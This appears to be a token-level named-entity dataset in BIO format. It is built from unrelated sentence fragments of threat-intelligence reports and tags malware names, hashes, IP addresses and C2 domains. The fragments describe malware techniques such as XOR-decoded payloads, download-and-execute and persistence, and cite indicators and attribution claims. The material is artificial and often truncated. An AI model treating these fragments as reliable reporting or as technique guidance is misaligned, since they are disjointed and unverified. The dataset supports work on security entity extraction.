extract	O
the	O
driver	O
binary	O
from	O
an	O
encoded	O
buffer	O
within	O
itself	O
,	O
decode	O
the	O
file	O
in	O
memory	O
(	O
using	O
a	O
rotating	O
4-byte	O
XOR	O
key	O
)	O
,	O
and	O
install	O
the	O
driver	O
on	O
the	O
victim	O
's	O
machine	O
as	O

File	O
Name	O
:	O
ID2016.doc	O
bfb3ca77d95d4f34982509380f2f146f63aa41bc	B-hash

In	O
the	O
app	O
's	O
page	O
we	O
learn	O
that	O
he	O
uses	O
the	O
name	O
Mo'ayyad	O
Ay	O
and	O
that	O
he	O
is	O
from	O
Gaza	O
'	O
In	O
the	O
YouTube	O
channel	O
linked	O
to	O
moayy2ad@gmail.com	B-url.normal
(	O
which	O
,	O
like	O
the	O
other	O
accounts	O
,	O
has	O
been	O
made	O
private	O
later	O
)	O
,	O
the	O
individual	O
has	O
uploaded	O
anti-Israeli	O
propaganda	O
videos	O
:	O

In	O
order	O
to	O
infect	O
the	O
victims	O
,	O
the	O
attackers	O
distributed	O
spear-phishing	O
emails	O
containing	O
malicious	O
excel	O
file	O
which	O
when	O
opened	O
dropped	O
a	O
malware	O
capable	O
of	O
downloading	O
additional	O
components	O
and	O
spying	O
on	O
infected	O
systems	O
.	O

The	O
URI	O
changed	O
too	O
,	O
it	O
contains	O
the	O
GravityRAT	B-malware.drop
variant	O
name	O
:	O
August	O
was	O
also	O
the	O
same	O
month	O
the	O
Indian	O
CERT	O
notified	O
potential	O
victims	O
that	O
GravityRAT	B-malware.drop
had	O
been	O
used	O
in	O
a	O
targeted	O
campaign	O
.	O

Cisco	O
Talos	O
has	O
identified	O
a	O
highly	O
targeted	O
campaign	O
against	O
13	O
iPhones	O
which	O
appears	O
to	O
be	O
focused	O
on	O
India	O
.	O

4d5a235048e94579aab0062057296186	B-hash

These	O
findings	O
call	O
into	O
question	O
claims	O
by	O
Gamma	O
International	O
that	O
previously	O
reported	O
servers	O
were	O
part	O
of	O
their	O
product	O
line	O
,	O
and	O
that	O
previously	O
discovered	O
copies	O
of	O
their	O
software	O
were	O
either	O
stolen	O
or	O
demo	O
copies	O
.	O

The	O
variant	O
version	O
of	O
GX	O
is	O
used	O
in	O
the	O
URI	O
.	O

Zcon.exe	O
변형은	O
[	O
그림	O
19	O
]	O
포트	O
스캐너	O
2015년	O
Bmdoor에서도	B-malware.backdoor
사용했다	O
.	O

BD_Keys	O
:	O
4D41474943424F58	O
...	O
[	O
]	O
...	O
9EB3506	O
BYTES	O

The	O
Poison	O
Ivy	O
shellcode	O
is	O
encrypted	O
using	O
a	O
custom	O
cipher	O
with	O
the	O
key	O
'	O
Tiger324	O
{	O
'	O
beginning	O
at	O
offset	O
0xFA5	O
and	O
ending	O
at	O
0x159E	O
.	O

play	O
heartbleed	O
likejacking	O

Some	O
older	O
versions	O
of	O
the	O
server	O
variant	O
use	O
a	O
different	O
set	O
of	O
DWORDs	O
to	O
validate	O
the	O
handshake	O
,	O
also	O
the	O
tests	O
are	O
the	O
same	O
.	O

Further	O
,	O
Hossein	O
Asgari	O
,	O
a	O
self-proclaimed	O
Iranian	O
hacker	O
,	O
managed	O
the	O
Simorgh	O
forum	O
and	O
worked	O
with	O
his	O
father	O
,	O
who	O
was	O
employed	O
by	O
the	O
IRGC	O
.	O

It	O
is	O
subjected	O
to	O
a	O
bitwise	O
NOT	O
operation	O
followed	O
by	O
encryption	O
using	O
a	O
randomly	O
generated	O
4-byte	O
XOR	O
key	O
.	O

Their	O
constant	O
striving	O
toward	O
improved	O
performance	O
,	O
the	O
fact	O
that	O
they	O
probably	O
executed	O
successful	O
attacks	O
and	O
the	O
current	O
turmoil	O
in	O
the	O
Middle	O
East	O
region	O
leads	O
us	O
to	O
the	O
conclusion	O
that	O
the	O
CopyKittens	B-malware.backdoor
will	O
keep	O
striking	O
targets	O
with	O
similar	O
profiles	O
in	O
the	O
near	O
future	O
.	O

70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
70	O
31	O
bd	O
cc	O
26	O
e9	O
23	O
60	O
80	O
4b	O
26	O
60	O
da	O
ad	O
28	O
60	O
34	O
10	O
2b	O
60	O
8e	O
72	O
2d	O
60	O
e8	O
d4	O
2f	O
60	O
42	O
37	O
32	O
60	O
9c	O
99	O
34	O
60	O
In	O
all	O
,	O
64	O
clock	O
readings	O
are	O
taken	O
.	O

Unlike	O
the	O
newer	O
poisoned	O
WinRAR	O
installers	O
,	O
StrongPity	O
hosted	O
several	O
Much	O
like	O
the	O
poisoned	O
WinRAR	O
installers	O
,	O
multiple	O
filenames	O
have	O
been	O
used	O
to	O
keep	O
up	O
with	O
visitor	O
interests	O
.	O

勒索病毒分析	O

It	O
installed	O
generating	O
capacity	O
represents	O
about	O
75	O
%	O
of	O
the	O
total	O
electricity	O
production	O
capacity	O
in	O
the	O
country	O
.	O
'	O

Filename	O
:	O
css.jpg	O

27	O
.	O

The	O
decrypted	O
CC	O
communication	O
information	O
is	O
as	O
follows	O
:	O
The	O
format	O
of	O
the	O
request	O
is	O
:	O
Among	O
them	O
,	O
the	O
parameter	O
p	O
is	O
the	O
current	O
process	O
authority	O
,	O
there	O
are	O
two	O
types	O
of	O
M	O
and	O
H	O
,	O
inst	O
parameter	O
is	O
the	O
current	O
installation	O
id	O
,	O
name	O
is	O
the	O
CC_name	O
obtained	O
by	O
decryption	O
,	O
this	O
time	O
is	O
pphp	O
.	O

In	O
addition	O
to	O
Windows	O
malware	O
,	O
the	O
TeleBots	O
group	O
used	O
Linux	O
ransomware	O
on	O
non-Windows	O
servers	O
.	O

These	O
files	O
have	O
a	O
different	O
internal	O
structure	O
than	O
PyInstallers	O
,	O
but	O
the	O
embedded	O
scripts	O
can	O
be	O
extracted	O
and	O
decoded	O
using	O
the	O
Python	O
module	O
uncompyle2.Passive	O
DNS	O
analysis	O
shows	O
that	O
games-playbox[.]com	B-url.cncsvr
has	O
shared	O
IP	O
address	O
with	O
other	O
suspicious	O
domains	O
:	O

In	O
some	O
instances	O
,	O
APT32	B-malware.infosteal
abandoned	O
direct	O
email	O
attachments	O
altogether	O
and	O
relied	O
exclusively	O
on	O
this	O
tracking	O
technique	O
with	O
links	O
to	O
their	O
ActiveMime	O
lures	O
hosted	O
externally	O
on	O
legitimate	O
cloud	O
storage	O
services	O
.	O

In	O
fact	O
,	O
two	O
of	O
the	O
same	O
Spanish	O
establishments	O
exchanged	O
high	O
data	O
volumes	O
with	O
the	O
IHU	O
source	O
range	O
IPs	O
.	O

Israeli	O
banks	O
.	O

This	O
document	O
revolves	O
around	O
the	O
prisoner	O
exchange	O
deal	O
with	O
the	O
Israeli	O
government	O
over	O
the	O
Israeli	O
soldier	O
Gilad	O
Shalit	O
,	O
held	O
hostage	O
by	O
Hamas	O
for	O
over	O
five	O
years	O
.	O

The	O
launcher	O
sets	O
up	O
several	O
registry	O
values	O
that	O
control	O
how	O
the	O
remote	O
access	O
tool	O
will	O
work	O
.	O

netsvcs.exe	O
-	O
the	O
modified	O
Team	O
Viewer	O
client	O
;	O
netsvcs_ko.dll	O
-	O
resources	O
library	O
of	O
Team	O
Viewer	O
client	O
;	O
vcmon.exe	O
-	O
installer/starter	O
;	O

These	O
actors	O
set	O
up	O
operational	O
infrastructure	O
to	O
obfuscate	O
their	O
source	O
infrastructure	O
,	O
host	O
domains	O
and	O
malware	O
for	O
targeting	O
organizations	O
,	O
establish	O
command	O
and	O
control	O
nodes	O
,	O
and	O
harvest	O
credentials	O
and	O
other	O
valuable	O
information	O
from	O
their	O
targets	O
.	O

DAT	O
files	O
VSE	O
BOP	O
Host	O
IPS	O
McAfee	O
Network	O
Security	O
Platform	O
Coverage	O
for	O
known	O
exploits	O
and	O
associated	O
malware	O
is	O
provided	O
as	O
Exploit-Comele	O
,	O
Roarur.dr	O
,	O
and	O
Roarur.dll	O
in	O
the	O
5862	O
DATs	O
,	O
released	O
January	O
15	O
.	O

ACCENTURE	O
PROVIDES	O
THE	O
INFORMATION	O
ON	O
AN	O
'	O
AS-IS	O
'	O
BASIS	O
WITHOUT	O
REPRESENTATION	O
OR	O
WARRANTY	O
AND	O
ACCEPTS	O
NO	O
LIABILITY	O
FOR	O
ANY	O
ACTION	O
OR	O
FAILURE	O
TO	O
ACT	O
TAKEN	O
IN	O
RESPONSE	O
TO	O
THE	O
INFORMATION	O
CONTAINED	O
OR	O
REFERENCED	O
IN	O
THIS	O
REPORT	O
.	O

We	O
further	O
assess	O
that	O
APT28	B-malware.infosteal
is	O
the	O
group	O
responsible	O
for	O
the	O
network	O
compromises	O
of	O
WADA	O
and	O
the	O
DNC	O
and	O
other	O
entities	O
related	O
to	O
the	O
2016	O
U.S.	O
presidential	O
election	O
cycle	O
.	O

A	O
multitier	O
botnet	O
architecture	O
included	O
40	O
C	O
&	O
C	O
servers	O
distributed	O
across	O
the	O
globe	O
including	O
servers	O
in	O
the	O
USA	O
,	O
Taiwan	O
,	O
Saudi	O
Arabia	O
,	O
Russia	O
,	O
and	O
India	O
.	O

The	O
following	O
table	O
reflects	O
testing	O
and	O
theoretical	O
contents	O
of	O
command	O
files	O
driving	O
netsat.exe	O
operation	O
:	O

Most	O
targets	O
are	O
from	O
the	O
Middle	O
East	O
,	O
some	O
are	O
in	O
the	O
United	O
States	O
and	O
Europe	O
.	O

Another	O
routine	O
seems	O
to	O
have	O
a	O
similar	O
goal	O
,	O
but	O
with	O
a	O
different	O
approach	O
.	O

The	O
adversary	O
proved	O
very	O
adaptive	O
and	O
responded	O
to	O
company	O
's	O
security	O
measures	O
by	O
periodically	O
changing	O
tools	O
,	O
techniques	O
and	O
procedures	O
(	O
TTPs	O
)	O
,	O
allowing	O
them	O
to	O
persist	O
on	O
the	O
network	O
for	O
such	O
an	O
extensive	O
period	O
of	O
time	O
.	O

Because	O
SPLM	B-malware.backdoor
is	O
their	O
primary	O
and	O
selective	O
second	O
stage	O
tool	O
,	O
SPLM	B-malware.backdoor
deployment	O
is	O
of	O
much	O
interest	O
.	O

Cluster	O
4	O
Cluster	O
4	O
Cluster	O
4	O
Cluster	O
4	O
Cluster	O
4	O
Cluster	O
4	O

These	O
techniques	O
will	O
be	O
discussed	O
in	O
detail	O
in	O
this	O
blog	O
post	O
.	O

As	O
always	O
,	O
we	O
here	O
at	O
FortiGuard	O
Labs	O
will	O
continue	O
to	O
monitor	O
events	O
in	O
order	O
to	O
hunt	O
for	O
,	O
catch	O
,	O
and	O
block	O
these	O
attacks	O
.	O

ACCENTURE	O
PROVIDES	O
THE	O
INFORMATION	O
ON	O
AN	O
'	O
AS	O
-	O
IS	O
'	O
BASIS	O
WITHOUT	O
REP	O
RESENTATION	O
OR	O
WARRANTY	O
AND	O
ACCEPTS	O
NO	O
LIABILITY	O
FOR	O
ANY	O
ACTION	O
OR	O
FAILURE	O
TO	O
ACT	O
TAKEN	O
IN	O
RESPONSE	O
TO	O
THE	O
INFORMATION	O
CONTAINED	O
OR	O
REFERENCED	O
IN	O
THIS	O
ALERT	O
.	O

*Appliances	O
must	O
be	O
configured	O
for	O
block	O
mode	O
.	O

If	O
a	O
user	O
or	O
an	O
application	O
modifies	O
the	O
ZxShell	B-malware.backdoor
service	O
registry	O
key	O
,	O
the	O
code	O
restores	O
the	O
original	O
infected	O
service	O
key	O
and	O
values	O
.	O

crystal_ext-min	O
+	O
angular	O
:	O
JS	O
inject	O
using	O
malicious	O
Chrome	O
extension	O
.	O

The	O
16-byte	O
XOR	O
key	O
will	O
be	O
randomly	O
generated	O
per	O
each	O
request	O
.	O

The	O
malware	O
is	O
injected	O
into	O
every	O
process	O
of	O
the	O
infected	O
machine	O
and	O
the	O
main	O
payload	O
is	O
executed	O
in	O
'	O
explorer.exe	O
'	O
as	O
we	O
explained	O
in	O
our	O
article	O
;	O
The	O
communication	O
channel	O
to	O
the	O
command	O
and	O
control	O
is	O
not	O
the	O
same	O
anymore	O
.	O

HookPasswordChange	O
–	O
Inspired	O
by	O
tools	O
found	O
on	O
GitHub	O
,	O
this	O
tool	O
alerts	O
the	O
attackers	O
if	O
a	O
password	O
has	O
been	O
changed	O
.	O

Using	O
the	O
same	O
decoding	O
routine	O
describe	O
by	O
Cassidian	O
in	O
a	O
PlugX	O
post	O
of	O
theirs	O
from	O
earlier	O
this	O
year	O
,	O
we	O
can	O
see	O
this	O
command	O
decodes	O
to	O
instruct	O
the	O
malware	O
to	O
connect	O
to	O
a	O
U.S.-based	O
Linode	O
IP	O
address	O
at	O
Hurricane	O
Electric	O
:	O
173.255.217.77.6939	B-ip.unknown
|	O
173.255.208.0/20	B-ip.unknown
|	O
HURRICANE	O
|	O
US	O
|	O
LINODE.COM	O
|	O
LINODE	O
A	O
look	O
at	O
passive	O
DNS	O
identifies	O
several	O
hostnames	O
that	O
recently	O
resolved	O
to	O
the	O
IP	O
address	O
.	O

We	O
just	O
came	O
up	O
with	O
the	O
right	O
place	O
on	O
the	O
stack	O
with	O
enough	O
buffer	O
,	O
which	O
in	O
this	O
case	O
is	O
esp+0x348	O
.	O

At	O
the	O
time	O
of	O
this	O
analysis	O
,	O
however	O
,	O
we	O
only	O
saw	O
it	O
resolved	O
to	O
the	O
IP	O
address	O
157.52.167.71	B-ip.unknown
,	O
which	O
is	O
the	O
same	O
IP	O
used	O
to	O
host	O
the	O
decoy	O
document	O
.	O

err=	O
%	O
d	O
setup35.exe	B-malware.backdoor
setup23.exe	O
act.te	O
ferf.st	O
fert.st	O
netwn.drv	O
DcpDcu	O
SystemPriClass	O
!	O
Cr	O
ne	O
j	O
Netui3.dll	B-malware.backdoor
The	O
following	O
interesting	O
strings	O
were	O
noted	O
in	O
the	O
raw	O
netui3.dll	B-malware.backdoor
file	O
:	O
set.fl	O
setup35.exe	B-malware.backdoor
setup32.exe	B-malware.backdoor
act.te	O
ferf.st	O
fert.st	O
u.t	O
setup23.exe	O
%	O
s	O
-­‐wu	O
%	O
s	O
%	O
s	O
-­‐ws	O
%	O
s	O
No	O
j	O
n	O
Mtx_Sp_On_PC_1_2_8	O
SystemPriClass	O
Winmgt.dll	B-malware.backdoor
The	O
following	O
interesting	O
strings	O
were	O
noted	O
in	O
the	O
raw	O
winmgt.dll	B-malware.backdoor
file	O
:	O
set.fl	O
setup35.exe	B-malware.backdoor
setup32.exe	B-malware.backdoor
act.te	O
ferf.st	O
fert.st	O
%	O
s	O
-­‐wu	O
%	O
s	O
No	O
j	O
n	O
Mtx_Sp_On_PC_1_2_8	O
\wins.log	O
SystemPriClass	O
Based	O
on	O
netsat.exe	B-malware.infosteal
manipulating	O
a	O
file	O
named	O
netui3.dll	B-malware.backdoor
,	O
the	O
submitted	O
netsat.exe	B-malware.infosteal
and	O
netui3.dll	B-malware.backdoor
appeared	O
associated	O
.	O

On	O
the	O
final	O
step	O
,	O
the	O
OPC	O
DA	O
payload	O
attempts	O
to	O
change	O
the	O
state	O
of	O
discovered	O
OPC	O
items	O
using	O
the	O
interface	O
by	O
writing	O
the	O
0x01	O
value	O
twice	O

This	O
data	O
is	O
encoded	O
with	O
base64	O
and	O
sent	O
as	O
an	O
argument	O
to	O
the	O
HTTP	O
GET	O
request	O
.	O

Both	O
accounts	O
clearly	O
relate	O
to	O
FEIB	O
,	O
though	O
we	O
could	O
n't	O
confirm	O
whether	O
the	O
credentials	O
are	O
valid	O
or	O
not	O
.	O

Randomly	O
generated	O
AES256	O
key	O
Figure	O
23	O
.	O

An	O
altogether	O
different	O
component	O
is	O
leveraged	O
once	O
Poseidon	B-malware.infosteal
reaches	O
an	O
important	O
machine	O
like	O
an	O
enterprise	O
's	O
Domain	O
Controller	O
.	O

Their	O
execution	O
is	O
managed	O
by	O
the	O
CMDEXEC	O
module	O
,	O
the	O
commands	O
being	O
stored	O
in	O
a	O
queue	O
inside	O
the	O
CMDEXECQ	O
module	O
.	O

All	O
of	O
the	O
fictitious	O
personalities	O
list	O
the	O
same	O
street	O
address	O
.	O

The	O
first	O
known	O
North	O
Korean	O
cryptocurrency	O
operation	O
occurred	O
in	O
February	O
2017	O
,	O
with	O
the	O
theft	O
of	O
$	O
7	O
million	O
(	O
at	O
the	O
time	O
)	O
in	O
cryptocurrency	O
from	O
South	O
Korean	O
exchange	O
Bithumb	O
.	O

This	O
is	O
another	O
wscript	O
file	O
implementing	O
AJAX	O
to	O
download	O
and	O
execute	O
a	O
relatively	O
large	O
compiled	O
executable	O
:	O
This	O
executable	O
code	O
is	O
saved	O
to	O
%	O
temp%\csrtsrm.exe	O
and	O
executed	O
there	O
.	O

대부분	O
외부와의	O
접점에	O
대한	O
보	O
안에	O
집중하기	O
쉬우나	O
중앙관리	O
솔루션	O
이용	O
공격과	O
같이	O
내부	O
인프라에서	O
발생하는	O
이벤트에	O
대한	O
모니터	O
링	O
또한	O
간과해서는	O
안된다	O
.	O

Even	O
though	O
the	O
scanned	O
servers	O
do	O
not	O
necessarily	O
look	O
like	O
potential	O
final	O
victims	O
,	O
it	O
is	O
likely	O
that	O
the	O
attackers	O
scanned	O
different	O
resources	O
to	O
find	O
a	O
server	O
that	O
could	O
be	O
used	O
to	O
establish	O
a	O
foothold	O
for	O
hosting	O
the	O
attackers	O
'	O
tools	O
and	O
,	O
subsequently	O
,	O
to	O
develop	O
the	O
attack	O
.	O

Right	O
now	O
,	O
its	O
c2	O
responds	O
with	O
anti-hero	O
images	O
of	O
'	O
Drinky	O
Crow	O
'	O
from	O
the	O
alt	O
Maakies	O
cartoon	O
:	O
Other	O
Darkhotel	B-malware.infosteal
c2s	O
tend	O
to	O
blend	O
in	O
with	O
random	O
sites	O
on	O
the	O
web	O
when	O
incorrect	O
or	O
missing	O
pages	O
are	O
visited	O
.	O

The	O
first	O
stage	O
SWF	B-malware.drop
includes	O
a	O
RSA+AES	O
cryptosystem	O
that	O
protects	O
the	O
subsequent	O
SWF	O
stage	O
,	O
containing	O
the	O
actual	O
exploit	O
,	O
which	O
it	O
downloads	O
and	O
executes	O
.	O

Email	O
containing	O
'	O
888888	O
'	O
password	O
in	O
body	O
with	O
password-protected	O
document	O
attached	O

In	O
fact	O
,	O
they	O
never	O
gave	O
up	O
,	O
even	O
when	O
the	O
attack	O
was	O
exposed	O
and	O
shut	O
down	O
by	O
the	O
defenders	O
.	O

systeminfo	O
–	O
get	O
the	O
systeminfo	O
of	O
the	O
computer	O

Dropper	O
execution	O
flow	O

16rXldeb16DXmdeV16og16bXkdeQ15nXlde	O
16rXldeb16DXmdeV16o=	O
16nXkScn15s=	O

The	O
information	O
below	O
dictates	O
open	O
source	O
research	O
on	O
the	O
adversary	O
's	O
creation	O
of	O
domains	O
.	O

Conventional	O
platform	O
architecture	O
for	O
Stuxnet	B-malware.backdoor
and	O
Duqu	B-malware.infosteal

In	O
CloudAtlas	B-malware.unknown
it	O
is	O
used	O
to	O
compress	O
the	O
logs	O
and	O
to	O
decompress	O
the	O
decrypted	O
payload	O
from	O
the	O
C	O
&	O
C	O
servers	O
,	O
while	O
in	O
Red	O
October	O
the	O
'	O
scheduler	O
'	O
plugin	O
uses	O
it	O
to	O
decompress	O
executable	O
payloads	O
from	O
the	O
C	O
&	O
C	O
.	O

High-level	O
view	O
of	O
malware	O
architecture	O

WSO	B-malware.backdoor
is	O
a	O
popular	O
web	O
shell	O
and	O
file	O
manager	O
(	O
it	O
stands	O
for	O
'	O
Web	B-malware.backdoor
Shell	I-malware.backdoor
by	O
Orb	O
'	O
)	O
that	O
has	O
the	O
ability	O
to	O
masquerade	O
as	O
an	O
error	O
page	O
containing	O
a	O
hidden	O
login	O
form	O
.	O

links	O

The	O
server	O
belonged	O
to	O
one	O
of	O
the	O
targeted	O
organizations	O
.	O

kdly	O

Deep	O
Panda	O
is	O
a	O
China	O
based	O
threat	O
group	O
CrowdStrike	O
has	O
observed	O
targeting	O
companies	O
in	O
the	O
defense	O
,	O
legal	O
,	O
telecommunication	O
and	O
financial	O
industries	O
.	O

The	O
packet	O
's	O
payload	O
data	O
is	O
,	O
in	O
and	O
of	O
itself	O
,	O
another	O
datagram	O
with	O
a	O
header	O
and	O
optional	O
payload	O
section	O
.	O

Figure	O
11	O
:	O
Database	O
management	O
requires	O
simple	O
configuration	O
parameters	O
to	O
connect	O
Figure	O
12	O
:	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
's	O
database	O
management	O
feature	O
lets	O
users	O
interact	O
with	O
a	O
database	O
and	O
even	O
provides	O
helpful	O
prepopulated	O
commands	O

Check	O
the	O
infographic	O
Popular	O
Posts	O
Homemade	O
Browser	O
Targeting	O
Banco	O
do	O
Brasil	O
Users	O
Vulnerabilities	O
in	O
Apache	O
CouchDB	O
Open	O
the	O
Door	O
to	O
Monero	O
Miners	O
Oracle	O
Server	O
Vulnerability	O
Exploited	O
to	O
Deliver	O
Double	O
Monero	O
Miner	O
Payloads	O
Cryptocurrency-Mining	O
Malware	O
:	O
2018	O
's	O
New	O
Menace	O
?	O

Figure	O
6	O
.	O

Figure	O
3	O
:	O
Phishing	O
Lure	O
Containing	O
HTML	O
Image	O
Tags	O
for	O
Additional	O
Tracking	O
When	O
a	O
document	O
with	O
this	O
feature	O
is	O
opened	O
,	O
Microsoft	O
Word	O
will	O
attempt	O
to	O
download	O
the	O
external	O
image	O
,	O
even	O
if	O
macros	O
were	O
disabled	O
.	O

For	O
example	O
as	O
in	O
http://pwc.blogs.com/cyber_security_updates/2015/01/destructive-malware.html	B-url.normal

[	O
>	O
]	O
'	O
*.php	O

경기도	O
성남시	O
분당구	O
판교역로	O
220	O
(	O
우	O
)	O
13493	O
|	O
대표전화	O
:	O
031-722-8000	O
|	O
팩스	O
:	O
031-722-8901	O
|	O
www.ahnlab.com	O
©	O
AhnLab	O
,	O
Inc	O
.	O

DLL	O
Plugin	O
functionality	O
allowing	O
additional	O
payloads	O
to	O
be	O
loaded	O
from	O
the	O
server	O

Whilst	O
this	O
additional	O
payload	O
is	O
executing	O
,	O
the	O
initial	O
malware	O
attempts	O
to	O
copy	O
itself	O
to	O
other	O
devices	O
on	O
the	O
network	O
.	O

Figure	O
12	O
.	O

ZIP	O
file	O

File	O
Name	O
:	O
reports-pdf.jar	B-malware.infosteal
File	O
Size	O
:	O
44237	O
bytes	O
MD5	O
:	O
39ad2cab9829ff6a1107b97f1496b499	B-hash
SHA1	O
:	O
1e9ab96ace86a45a33c4ff88a97186efb55e51fb	B-hash

IronStealer	B-malware.infosteal
(	O
<	O
RANDOM	O
>	O
.dat	O
)	O
:	O

Here	O
's	O
the	O
code	O
responsible	O
for	O
checking	O
the	O
extensions	O
to	O
target	O
in	O
the	O
current	O
version	O
of	O
ExPetr	O
:	O
This	O
works	O
by	O
going	O
through	O
the	O
target	O
file	O
system	O
in	O
a	O
recursive	O
way	O
,	O
then	O
checking	O
if	O
the	O
extension	O
for	O
each	O
file	O
is	O
included	O
in	O
the	O
dot-separated	O
list	O
.	O

This	O
includes	O
file	O
encryption	O
that	O
can	O
be	O
used	O
as	O
a	O
complement	O
to	O
the	O
disk-encrypting	O
MBR	O
.	O

It	O
does	O
n't	O
access	O
the	O
Internet	O
directly	O
from	O
the	O
code	O
,	O
but	O
it	O
uses	O
the	O
system-installed	O
mshta.exe	O
binary	O
.	O

9	O
,	O
2018	O
,	O
4:25	O
a.m.	O
)	O
After	O
the	O
document	O
is	O
opened	O
,	O
the	O
victim	O
is	O
presented	O
with	O
a	O
message	O
from	O
Office	O
365	O
to	O
asking	O
the	O
victim	O
to	O
'	O
E	O
nable	O
content	O
'	O
(	O
see	O
Exhibit	O
1	O
)	O
.	O

BF551FBDCF5A982705C01094436883A6AD3B75BD	B-hash

The	O
encryption	O
was	O
a	O
Tiny	O
Encryption	O
Algorithm	O
(	O
TEA	O
)	O
implementation	O
that	O
used	O
a	O
key	O
that	O
was	O
modified	O
during	O
encryption	O
and	O
decryption	O
operations	O
.	O

The	O
POC	O
samples	O
are	O
as	O
below	O
:	O
Detailed	O
procedures	O
:	O
1	O
)	O
First	O
create	O
a	O
cla1	O
instance	O
assigned	O
to	O
b	O
,	O
and	O
then	O
assign	O
value	O
0	O
to	O
b	O
,	O
because	O
at	O
this	O
point	O
b	O
's	O
referenced	O
count	O
is	O
1	O
,	O
causing	O
cla1	O
's	O
Class_Terminate	O
function	O
to	O
be	O
called	O
.	O

As	O
of	O
this	O
publication	O
,	O
40	O
of	O
the	O
links	O
have	O
been	O
clicked	O
at	O
least	O
once	O
.	O

Table	O
2	O
contains	O
a	O
sample	O
of	O
recovered	O
APT32	B-malware.infosteal
multilingual	O
lure	O
files	O
.	O

typedef	O
struct	O
_ZX_PLUGINS_STRUCT	O
{	O
LPSTR	O
lpStrRegKey	O
;	O
//	O
+	O
0x00	O
-	O
ZxShell	B-malware.backdoor
Plugins	I-malware.backdoor
registry	O
key	O
string	O
//	O
(	O
like	O
'	O
SYSTEM\CurrentControlSet\Control\zxplug	O
'	O
)	O
DWORD	O
dwUnknown2	O
;	O
//	O
+	O
0x04	O
-	O
Unknown	O
DWORD	O
value	O
LPVOID	O
lp138hBuff	O
;	O
//	O
+	O
0x08	O
-	O
Plugins	O
list	O
DWORD	O
dwZero	O
;	O
//	O
+	O
0x0C	O
-	O
Always	O
zero	O
HANDLE	O
hReg	O
;	O
//	O
+	O
0x10	O
-	O
Handle	O
to	O
plugin	O
registry	O
key	O
}	O
ZX_PLUGINS_STRUCT	O
,	O
*PZX_PLUGINS_STRUCT	O
;	O

shell.bat	O
.	O

If	O
the	O
confi	O
guration	O
strings	O
are	O
not	O
found	O
,	O
the	O
application	O
exits	O
.	O

The	O
size	O
of	O
the	O
requested	O
payload	O
file	O
is	O
approximately	O
199K	O
.	O

FireEye	O
disclosed	O
that	O
the	O
Nasr	O
Institute	O
was	O
an	O
APT	O
33	O
contractor	O
in	O
an	O
operation	O
that	O
used	O
publicly	O
available	O
backdoors	O
and	O
remote	O
access	O
trojans	O
.	O

In	O
response	O
,	O
we	O
shared	O
with	O
Microsoft	O
the	O
relevant	O
details	O
of	O
the	O
0day	O
vulnerability	O
in	O
a	O
timely	O
manner	O
.	O

Network	O
Indicators	O
Associated	O
with	O
C2	O
:	O

Emails	O
Accounts	O
Bitcoin	O
cv.doc	O
cv.pdf	O
Login	O
Data	O
KeyWord	O
.wallet	O
.pfx	O
.ovpn	O

The	O
documents	O
accompanying	O
the	O
malware	O
executables	O
seem	O
all	O
related	O
to	O
Indian	O
military	O
matters	O
.	O

HKLM\Software\Microsoft\Windows\CurrentVersion\Run	O

The	O
subject	O
usually	O
revolves	O
around	O
defense	O
and	O
security	O
or	O
current	O
affairs	O
.	O

Foreword	O
..............................................................................................................................................................	O
3	O
Acknowledgments	O
.......................................................................................................................................	O
3	O
Background	O
...........................................................................................................................................................	O
4	O
Targeting	O
and	O
incidents	O
........................................................................................................................................	O
5	O
Who	O
are	O
they	O
after	O
?	O

Avast	O
classified	O
this	O
as	O
a	O
backdoor	O
Trojan	O
and	O
infostealer	O
.	O

Therefore	O
,	O
our	O
analysts	O
carried	O
out	O
comparison	O
analysis	O
on	O
Beacon	O
generated	O
by	O
Cobalt	O
Strike	O
,	O
and	O
authenticated	O
the	O
relationships	O
between	O
them	O
.	O

Ravand	O
Cybertech	O
offers	O
,	O
via	O
its	O
website	O
ravand[.]com	B-url.normal
,	O
cloud	O
hosting	O
solutions	O
,	O
among	O
other	O
services	O
.	O

3	O
.	O

Server	O
Uranio4	O

char	O
*data_	O
;	O

The	O
command	O
and	O
control	O
server	O
in	O
question	O
was	O
located	O
at	O
.	O

'sdbn.dll	O
'	O

Commix	O
—	O
a	O
vulnerability	O
search	O
and	O
command	O
injection	O
and	O
exploitation	O
tool	O
written	O
in	O
Python	O
.	O

The	O
FinFisher	B-malware.infosteal
Suite	I-malware.infosteal
is	O
described	O
by	O
its	O
distributors	O
,	O
Gamma	O
International	O
UK	O
Ltd.	O
,	O
as	O
'	O
Governmental	O
IT	O
Intrusion	O
and	O
Remote	O
Monitoring	O
Solutions	O
.	O
'	O

i=	O
{	O
Custom	O
BASE64	O
}	O

Sample	O
:	O
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197	B-hash
In	O
a	O
more	O
recent	O
version	O
of	O
the	O
modified	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
malware	O
,	O
Ghost	O
Dragon	O
implemented	O
dynamic	O
packet	O
flags	O
which	O
change	O
the	O
first	O
five	O
bytes	O
of	O
the	O
header	O
in	O
every	O
login	O
request	O
with	O
the	O
controller	O
.	O

These	O
connections	O
,	O
combined	O
with	O
the	O
implant	O
's	O
nearly	O
identical	O
appearance	O
to	O
known	O
variants	O
,	O
are	O
a	O
strong	O
indication	O
that	O
we	O
have	O
uncovered	O
a	O
Hidden	B-malware.unknown
Cobra	I-malware.unknown
attack	O
.	O

2016	O
년	O
10월에는	O
소프트웨어	O
제작사	O
홈페이지를	O
해킹해	O
정상	O
설치	O
파일을	O
악성코드가	O
포함된	O
파일로	O
바꿔치기	O
해	O
온라인	O
도박	O
게임에서	O
상대방의	O
패를	O
몰래	O
엿볼	O
수	O
있는	O
악성코드를	O
배포한다	O
.	O

Example	O
of	O
DarkComet	B-malware.backdoor
's	O
encrypted	O
comms	O

The	O
indicators	O
associated	O
with	O
this	O
attack	O
are	O
provided	O
so	O
that	O
the	O
organizations	O
(	O
Government	O
,	O
Public	O
,	O
Private	O
organizations	O
,	O
Defense	O
and	O
Defense	O
equipment	O
manufacturers	O
)	O
can	O
use	O
these	O
indicators	O
to	O
detect	O
,	O
remediate	O
and	O
investigate	O
this	O
attack	O
campaign	O
.	O

72FD6074915F8F123EB44B3DD475D36B	B-hash
